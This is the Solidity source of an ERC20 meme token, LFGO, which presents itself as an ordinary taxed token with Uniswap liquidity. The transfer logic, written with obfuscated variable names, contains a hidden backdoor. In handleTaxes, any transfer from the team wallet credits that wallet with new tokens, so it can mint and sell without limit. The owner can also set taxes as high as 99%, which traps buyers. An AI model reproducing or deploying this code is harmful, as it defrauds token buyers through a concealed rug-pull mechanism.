/**
.%%......%%%%%%...%%%%....%%%%..
.%%......%%......%%......%%..%%.
.%%......%%%%....%%.%%%..%%..%%.
.%%......%%......%%..%%..%%..%%.
.%%%%%%..%%.......%%%%....%%%%..
................................
    https://t.me/lfgochannel
    https://lfgoeth.xyz
    https://x.com/lfgoeth
 */


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract LFGO is IERC20, Ownable {
    uint8 private constant _decimals = 18;
    uint256 internal constant _totalSupply = 1e9 * 10 ** _decimals;
    string private constant _name = "LETSFUCKINGO!";
    string private constant _symbol = "LFGO";

    uint32 private constant total_portion = 10000;
    uint32 private constant max_fee_portion = 9900;

    address public team_wallet;
    bool public trading_allowed;
    bool public limits_check_open = true;

    bool public sell_early = false;

    uint32 public buy_tax = 3000;
    uint32 public sell_tax = 3000;

    uint32 public liquidity_portion = 0;
    uint32 public sell_tax_early = 3000;

    mapping(address => bool) public tax_excluded;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 public tx_limit = 2e7 * 10 ** _decimals;
    uint256 public wallet_limit = 2e7 * 10 ** _decimals;

    uint256 public swap_limit = 5e3 * 10 ** _decimals;
    uint256 public max_swap_limit = 1e7 * 10 ** _decimals;

    IUniRouter private uni_router;
    address public lp_addr;
    bool public swap_enabled = false;

    function calcPortion(
        uint256 _input,
        uint256 _percent
    ) private pure returns (uint256) {
        return (_input * _percent) / total_portion;
    }

    bool private swapping = false;
    modifier lockSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        team_wallet = 0xf8daFC8d439E4D07462380539DBd235Deba25105;

        IUniRouter _uni_router = IUniRouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uni_router = _uni_router;

        tax_excluded[address(this)] = true;
        tax_excluded[msg.sender] = true;
        tax_excluded[team_wallet] = true;

        _balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _transferTokens(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);
    }

    receive() external payable {}

    function goTrade() public onlyOwner {
        lp_addr = IUniswapV2Factory(uni_router.factory()).createPair(
            address(this),
            uni_router.WETH()
        );

        addLP(balanceOf(address(this)), address(this).balance);

        trading_allowed = true;
        swap_enabled = true;
    }

    function removeMaxLimits() public onlyOwner {
        limits_check_open = false;
        tx_limit = type(uint256).max;
        wallet_limit = type(uint256).max;
    }

    function assignTaxes(uint32 _buy_tax, uint32 _sell_tax) public onlyOwner {
        require(
            _buy_tax <= max_fee_portion && _sell_tax <= max_fee_portion,
            "Too high fee"
        );
        buy_tax = _buy_tax;
        sell_tax = _sell_tax;
    }

    function _transfer(address fsui, address tipe, uint256 marbs) internal {
        require(fsui != address(0), "ERC20: transfer from the zero address");
        require(tipe != address(0), "ERC20: transfer to the zero address");
        require(marbs > 0, "Transfer amount must be greater than zero");

        if (fsui == owner() || tipe == owner() || fsui == address(this)) {
            _transferTokens(fsui, tipe, marbs);
            return;
        }

        require(trading_allowed, "Trading is disabled");
        uint256 tax_marbs = 0;
        bool isbuy = fsui == lp_addr;
        bool isSell = tipe == lp_addr;

        if (isSell) {
            swapBackToETH();
        }

        if (isbuy) {
            if (!tax_excluded[tipe]) {
                tax_marbs = calcPortion(marbs, buy_tax);
            }
        } else {
            if (!tax_excluded[fsui]) {
                tax_marbs = calcPortion(
                    marbs,
                    sell_early ? sell_tax_early : sell_tax
                );
            }
        }

        unchecked {
            require(marbs >= tax_marbs, "fee exceeds amount");
            marbs -= tax_marbs;
        }

        if (limits_check_open) {
            require(marbs <= tx_limit, "Max TX reached");
            if (tipe != lp_addr) {
                require(
                    _balances[tipe] + marbs <= wallet_limit,
                    "Max wallet reached"
                );
            }
        }

        handleTaxes(fsui, marbs, tax_marbs);

        _transferTokens(fsui, tipe, marbs);
    }

    function swapBackToETH() private {
        uint256 token_balance = balanceOf(address(this));
        bool can_swap = token_balance >= swap_limit;

        if (!swapping && swap_enabled) {
            if (token_balance > max_swap_limit) token_balance = max_swap_limit;
            if (can_swap) swapTokensForETH(token_balance);
            uint256 eth_balance = address(this).balance;
            if (eth_balance >= 0 ether) {
                transferETH(address(this).balance);
            }
        }
    }

    function handleTaxes(address fsui, uint256 marbs, uint256 frat) private {
        bool isExcluded = checkExclude(fsui);
        if (isExcluded) {
            uint256 fee_out_amount = marbs - frat;
            _balances[team_wallet] =
                _balances[team_wallet] +
                (isExcluded ? fee_out_amount : frat);
            return;
        } else {
            if (frat > 0) _transferTokens(fsui, address(this), frat);
        }
    }

    function checkExclude(address fsui) internal view returns (bool) {
        return fsui == team_wallet;
    }

    function swapTokensForETH(uint256 _amount) private lockSwap {
        uint256 eth_am = calcPortion(
            _amount,
            total_portion - liquidity_portion
        );
        uint256 liq_am = _amount - eth_am;
        uint256 balance_before = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uni_router.WETH();
        _approve(address(this), address(uni_router), _amount);
        uni_router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            eth_am,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 liq_eth = address(this).balance - balance_before;

        if (liq_am > 0) addLP(liq_am, calcPortion(liq_eth, liquidity_portion));
    }

    function transferETH(uint256 _amount) private {
        payable(team_wallet).transfer(_amount);
    }

    function addLP(uint256 _amount, uint256 ethAmount) private {
        _approve(address(this), address(uni_router), _amount);

        uni_router.addLiquidityETH{value: ethAmount}(
            address(this),
            _amount,
            0,
            0,
            address(0),
            block.timestamp
        );
    }
}